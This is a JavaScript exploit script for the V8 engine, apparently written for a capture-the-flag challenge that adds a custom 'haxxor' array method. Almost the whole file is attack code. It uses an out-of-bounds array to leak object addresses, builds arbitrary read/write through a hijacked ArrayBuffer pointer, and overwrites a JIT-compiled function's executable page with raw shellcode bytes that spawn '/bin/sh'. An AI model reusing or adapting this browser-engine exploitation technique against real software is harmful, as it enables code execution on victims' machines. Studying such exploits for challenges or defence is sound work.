// pre-alloc
var base = new ArrayBuffer(8);
var f64 = new Float64Array(base);
var i32 = new Uint32Array(base);
var i8 = new Uint8Array(base);

function d2i_low(f) {
    f64[0] = f;
    return i32[0];
}
function d2i_high(f) {
    f64[0] = f;
    return i32[1];
}
function i2d(x0, x1) {
    i32[0] = x0;
    i32[1] = x1;
    return f64[0];
}
function d2b(f) {
    f64[0] = f;
    return [];
}
/* 64bit integer add */
function i64add(x0, x1, y) {
    var carry = 4294967295 - y < x0 ? 1 : 0;
    return [(x0+y) & 0xffffffff, x1+carry];
}

// Return the hexadecimal representation of the given byte.
function hex(b) {
    return ('0' + b.toString(16)).substr(-2);
}

// Return the hexadecimal representation of the given byte array.
function hexlify(bytes) {
    var res = [];
    for (var i = 0; i < bytes.length; i++)
        res.push(hex(bytes[i]));

    return res.join('');
}

/* EXPLOIT */

function shellcode(x) {
    // Something to keep turbofan from inlining this function
    // (Might not be required, just to be safe...)
    for (var i = 2; i < x / 2; i++) {
        if (x % i == 0)
            return false;
    }
    return true;
}

// Force JIT compiliation
for (var i = 0; i < 1000; i++)
	shellcode(i);

// contains 
var arr = [0.0, 1.1, 2.2, 3.3];
// %DebugPrint(arr);

// hopefully these objects land after arr.elements
var arrBuf = new ArrayBuffer(0x4141);
// elements are inlined into the object
var shcodeWrap = { a: 0x43434343, b: shellcode, c: 0x44444444 };

// array.length = 0x1337
// array.elements.length = 4
arr.haxxor();

var arrBufferOffset = null,
    shellCodeObjAddr = [null, null];

// find ArrayBuffer
for(var i = 0; i < arr.length; i++) {
    if(d2i_high(arr[i]) == 0x4141) {
        arrBufferOffset = i+1;
        break;
    }
}
// find shellcode obj addr
for(var i = 0; i < arr.length; i++) {
    if(d2i_high(arr[i]) == 0x43434343) {
        shellCodeObjAddr[0] = d2i_low(arr[i+1])-1;
        shellCodeObjAddr[1] = d2i_high(arr[i+1]);
        break;
    }
}

console.log(arrBufferOffset);
console.log(shellCodeObjAddr[1].toString(16) + shellCodeObjAddr[0].toString(16));

// RW primitive
var RW = new DataView(arrBuf);
function readPtr(a0, a1) {
    // set buffer addr
    arr[arrBufferOffset] = i2d(a0, a1);
    return [RW.getUint32(0, true), RW.getUint32(4, true)];
}
function writeBytes(a0, a1, bytes) {
    // set buffer addr
    arr[arrBufferOffset] = i2d(a0, a1);
    for(var i = 0; i < bytes.length; i++) {
        var x;
        switch(typeof bytes[i]) {
            case 'number':
                x = bytes[i];
                break;
            case 'string':
                x = bytes.charCodeAt(i);
                break;
        }
        RW.setUint8(i, x);
    }
}

// offset from code page object to RWX page pointer
var codeObjOff = 0x30;
// offset from code page pointer to code entry
var codeEntryOff = 0x40-1;

var codeObj = readPtr(shellCodeObjAddr[0]+codeObjOff, shellCodeObjAddr[1]);
console.log(codeObj[1].toString(16) + codeObj[0].toString(16));

var cmd = "sh\0";
/* execve("/bin/sh", {"/bin/sh", "-c", cmd}, NULL) */
var code = [72, 184, 47, 98, 105, 110, 47, 115, 104, 0, 80, 84, 95, 104, 45, 
99, 0, 0, 84, 94, 49, 210, 82, 72, 141, 5, 11, 0, 0, 0, 80, 86, 
87, 72, 137, 230, 106, 59, 88, 15, 5];
for(var i = 0; i < cmd.length; i++) {
    code.push(cmd.charCodeAt(i));
}
codeObj = i64add(codeObj[0], codeObj[1], codeEntryOff);
writeBytes(codeObj[0], codeObj[1], code);
shellcode();
